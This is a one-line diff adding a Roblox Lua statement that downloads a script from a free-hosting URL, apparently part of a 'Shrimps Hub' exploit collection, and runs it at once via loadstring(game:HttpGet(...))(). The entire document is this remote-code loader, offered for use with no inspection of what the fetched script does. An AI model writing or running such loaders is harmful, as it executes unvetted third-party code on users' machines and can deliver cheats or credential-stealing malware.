@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://shrimpshub.000webhostapp.com/ShrimpsHub/Shrimps%20Hub%20Scripts/Others/Shrimps%20Chat"))()
